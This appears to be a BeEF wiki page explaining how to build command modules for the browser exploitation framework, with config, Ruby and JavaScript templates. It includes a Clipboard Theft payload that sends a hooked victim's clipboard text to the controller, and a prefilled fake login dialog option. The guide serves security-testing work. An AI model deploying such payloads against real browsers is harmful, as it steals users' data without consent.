## Introduction

BeEF has been designed using modular development principles so that it is very easy to create and add new functionality with command modules.

Modules are all stored in the [beef/modules](https://github.com/beefproject/beef/tree/master/modules) directory and are composed of three main files:
* **config.yaml** - configuration file describing the properties of a module
* **module.rb** - enables integration of the module with the BeEF web interface
* **command.js** -  the JavaScript "payload" which will be executed on the hooked browser

#### Table of Contents

* [YAML Configuration File (config.yaml)](#yaml-configuration-file-configyaml)
* [Web Interface Integration (module.rb)](#web-interface-integration-modulerb)
* [Javascript Payload (command.js)](#javascript-payload-commandjs)
* [Other Useful Examples](#other-useful-examples)
* [What Now?](#what-now)
* [References](#references)

## YAML Configuration File (config.yaml)

The YAML configuration file embeds five pieces of information:
* The name of the module
* The name of the author
* The description of the module
* The category of the module
* The compatible browsers and OS 

For example, here is the config.yaml of the [Detect Firebug](https://github.com/beefproject/beef/blob/master/modules/browser/detect_firebug/config.yaml) module:
```yaml
beef:
    module:
        detect_firebug:
            enable: true
            category: "Browser"
            name: "Detect FireBug"
            description: "This module checks if the Mozilla Firefox Firebug extension is being use to inspect the current window."
            authors: ["bcoles"]
            target:
                 working: ["FF"]
                 not_working: ["All"]
```

Three arrays are used to define browser compatibility: **working**, **not_working** or **user_notify**.

Browsers are abbreviated using main letters:
* **"FF":** Firefox
* **"O":** Opera
* **"C":** Chrome
* **"S":** Safari
* **"IE":** Internet Explorer 
* **"All":** All browsers

It is possible to define a minimum and maximum version exploitable by providing for each browser.

The [Get Visited URL](https://github.com/beefproject/beef/blob/master/modules/browser/get_visited_urls/config.yaml) module is a good example :
```yaml
target:
    working:
        IE:
            min_ver: 6
            max_ver: 7
        FF:
            min_ver: 3
            max_ver: 3
        C:
            min_ver: 1
            max_ver: 5
        S:
            min_ver: 3
            max_ver: 3
        O:
            min_ver: 1
            max_ver: 10
    not_working: ["All"]
```

You can find more detailed information on command module config [[here|Command-Module-Config]].

## Web Interface Integration (module.rb)

Next, you need to write the _module.rb_ file which defines how the module will appear in the BeEF interface. Don't panic, you don't need to be a Ruby expert to create this file. BeEF has defined high level methods and objects to do this, so it's more like filling out a template.

### Basic Architecture

Start out by creating the file and using this template:

```ruby
class Your_module_name < BeEF::Core::Command

    # This method defines the options proposed to the user in the web interface
    def self.options
    end

    # This method will be called before sending the payload
    def pre_send
    end

    # This method will be called when BeEF receives an answer from the hooked browser
    def post_execute
    end
end
```

### Defining Data Types

The **self.options** method should return an array which defines data proposed to the user. Here is an example with different fields taken from existing modules:

```ruby
  def self.options
    return [{
      'name'=>'key_paths', 
      'ui_label' => 'Key(s)',
      'description' => 'Enter registry keys. Note: each key requires its own line', 
      'type'=>'textarea', 
      'width' => '500px', 
      'height' => '350px', 
      'value'=>'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation\\SystemProductNam'
    },
    {
      'name' => 'iFrameSandbox',
      'ui_label' => 'Sandbox', 
      'type' => 'checkbox',
      'checked' => 'checked' 
    },
    {
      'name' => 'choice', 
      'type' => 'combobox',
      'ui_label' => 'Dialog Type',
      'store_type' => 'arraystore', 
      'store_fields' => ['choice'], 
      'store_data' => [['Facebook'],['LinkedIn'],['Generic']], 
      'valueField' => 'choice', 
      'value' => 'Facebook', 
      editable: false, 
      'displayField' => 'choice', 
      'mode' => 'local', 
      'autoWidth' => true 
    }]
  end
```

More detailed information on data types can be found [[here|Form-Data-Types]].

### Save Returned Information

It is possible to save information gathered by the script in the list of information on the hooked browser. This action should be done in the **post_execute** function, for example here is the source code of the [Browser Fingerprint](https://github.com/beefproject/beef/blob/master/modules/browser/browser_fingerprinting/module.rb) module:

```ruby
  def post_execute
    content = {}
    content['browser_type'] = @datastore['browser_type'] if not @datastore['browser_type'].nil?
    content['browser_version'] = @datastore['browser_version'] if not @datastore['browser_version'].nil?
    if content.empty?
      content['fail'] = 'Failed to fingerprint browser.'
    end
    save content
  end
```

**@datastore** is a dictionary of information returned by the JavaScript payload

## Javascript Payload (command.js)

The last mandatory file is `command.js` which contains the JavaScript payload. The payload should be included in a function called by **beef.execute**. Except that you can do anything you want here.

The following command should be used to return information to the BeEF controller:
```erb
beef.net.send("<%= @command_url %>", <%= @command_id %>, "data");
```

The BeEF JavaScript API already includes a lot of interesting features and embedded jQuery (see [[here|Javascript-API]]). 

Here is an interesting example taken from the [Clipboard Theft](https://github.com/beefproject/beef/blob/master/modules/host/clipboard_theft/command.js) module:

```javascript
beef.execute(function() {
  if (clipboardData.getData("Text") !== null) {
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "clipboard="+clipboardData.getData("Text"));
  } else {
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "clipboard=clipboardData.getData is null or not supported.");
  }
});
```

## Other Useful Examples

### Bind an External Object to a Specified URI

You can bind an external object to a defined URI in order to use it from the hooked browser:

```ruby
class Your_module < BeEF::Core::Command
    def pre_send
        BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/path/to/file','/uri','extension')
    end

    def post_execute
        BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/uri.extension')
    end 
end
```

### Bind a Raw HTTP Response to a Specified URI

You can bind a raw HTTP response (headers and body) to a defined URI in order to use it from the hooked browser:

```ruby
  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind_raw('200', {'Content-Type'=>'text/html'}, 'hello world!', '/hello_world', -1)
  end
```

### Use BeEF Configuration Information

You can use information from the BeEF configuration in your `module.rb`:

```ruby
class Your_module < BeEF::Core::Command
    def self.options
        configuration = BeEF::Core::Configuration.instance
        hook_uri = "http://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}/demos/report.html"
        return [
            {'name' => 'url', 'ui_label'=>'URL', 'type' => 'text', 'width' => '400px', 'value' => hook_uri },
        ]
    end 
end
````

## What Now?

If you think that your module can be useful to other people, join the BeEF community on GitHub, fork the beef repository, upload your module and create a new issue for proposing it.

We like people with new ideas! :)

## References

* [`config.yaml`](https://github.com/beefproject/beef/wiki/Command-Module-Config)
* [`module.rb` Form Data Types](https://github.com/beefproject/beef/wiki/Form-Data-Types)

***

[[BeEF Console|BeEF-Console]] | [[WebRTC Extension|WebRTC-Extension]]